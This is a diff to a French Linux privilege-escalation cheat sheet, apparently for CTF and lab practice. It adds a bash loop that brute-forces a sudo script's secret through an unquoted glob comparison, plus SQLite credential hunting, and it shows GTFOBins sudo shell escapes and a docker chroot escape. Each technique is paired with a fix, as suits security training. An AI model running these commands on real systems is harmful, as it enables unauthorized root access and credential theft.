@@ -47,7 +47,29 @@ sudo /usr/bin/find . -exec /bin/sh \; -quit
 sudo vim -c ':!/bin/sh'
 # (LD_PRELOAD / env_keep, versions de sudo vulnérables : CVE-2021-3156 Baron Samedit)
 ```
+Lecture d'une entrée : `(runas_user : runas_group)  TAG:  commande`. `(root)` = lançable en root ; **pas de `NOPASSWD:`** = mot de passe requis ; chemin exact sans `*` = seule cette commande.
 > **Correctif** : restreindre les règles sudo, jamais de binaire interactif/évasif en NOPASSWD.
+
+### Script sudo « maison » — lire son code (Codify)
+Si `sudo -l` autorise un **script** (pas un binaire connu) : d'abord `ls -l` (écrivable → on met ce qu'on veut → root direct), sinon **lire le code** et abuser de sa logique.
+```bash
+ls -l /opt/scripts/le_script.sh     # écrivable par moi ? -> game over direct
+cat /opt/scripts/le_script.sh       # sinon : chercher la faille de logique
+```
+**Faille classique : comparaison de mot de passe non quotée** → `[[ $SECRET == $INPUT ]]` (INPUT non quoté) traite `$INPUT` comme un **motif glob**, pas une chaîne. On devine le secret **caractère par caractère** :
+```bash
+sudo -v                             # cacher l'auth sudo une fois
+charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+='
+found=''
+while true; do ok=0
+  for ((i=0;i<${#charset};i++)); do c="${charset:$i:1}"
+    if echo "${found}${c}*" | sudo /opt/scripts/le_script.sh 2>/dev/null | grep -q "confirmed"; then
+      found="${found}${c}"; echo "[+] $found"; ok=1; break; fi
+  done
+  [ $ok -eq 0 ] && { echo "[*] $found"; break; }
+done
+```
+> Même famille : **injection par wildcard** (`tar`/`rsync`/`chown *` dans un cron). **Correctif** : **quoter** (`"[[ "$a" == "$b" ]]"`), comparer des hashs, pas de wildcard non contrôlé.
 
 ### SUID / SGID
 Binaires s'exécutant avec les droits du **propriétaire** (souvent root).
@@ -113,6 +135,7 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```bash
 grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /etc /opt 2>/dev/null
 cat ~/.*history ; find / -name "*.conf" 2>/dev/null
+find / -name "*.db" 2>/dev/null               # bases SQLite d'applis (sqlite3 -> .tables -> users)
 ```
 
 ### Noyau (dernier recours)
@@ -127,14 +150,14 @@ searchsploit linux kernel <version>          # ex. DirtyPipe, DirtyCow, PwnKit
 ## 4. Résumé express (ordre à dérouler)
 
 ```
-1. sudo -l
+1. sudo -l   (+ lire le code d'un script sudo autorisé)
 2. SUID / SGID  (find -perm)
 3. capabilities (getcap)
 4. cron        (pspy)
 5. PATH
 6. fichiers écrivables (passwd, clés)
 7. groupes (docker/lxd/disk)
-8. secrets qui traînent
+8. secrets qui traînent (configs, *.db SQLite, historiques)
 9. NFS
 10. noyau (en dernier)
 ```
@@ -143,7 +166,7 @@ searchsploit linux kernel <version>          # ex. DirtyPipe, DirtyCow, PwnKit
 
 ## 5. Côté défense
 
-Retirer les SUID inutiles, corriger les chemins/permissions de scripts cron, `root_squash` sur NFS, moindre privilège sur les groupes, mises à jour du noyau et de sudo, secrets hors des fichiers de conf.
+Retirer les SUID inutiles, corriger les chemins/permissions de scripts cron, `root_squash` sur NFS, moindre privilège sur les groupes, mises à jour du noyau et de sudo, secrets hors des fichiers de conf, et **quoter** toute comparaison en bash.
 
 ---
 
@@ -152,6 +175,7 @@ Retirer les SUID inutiles, corriger les chemins/permissions de scripts cron, `ro
 - **Pourquoi énumérer avant d'exploiter**, et pourquoi une checklist figée.
 - **SUID vs capabilities vs sudo** : trois mécanismes de droits, trois surfaces.
 - **GTFOBins** : le réflexe pour transformer un binaire autorisé en shell.
+- **Script sudo + glob non quoté** : fuite d'un secret caractère par caractère (Codify).
 - Pour chaque piste : la **justifier** et donner le **correctif** (c'est ça, le niveau responsable).
 
 **Labs** : TryHackMe « Linux PrivEsc », machines HTB Linux Easy/Medium.
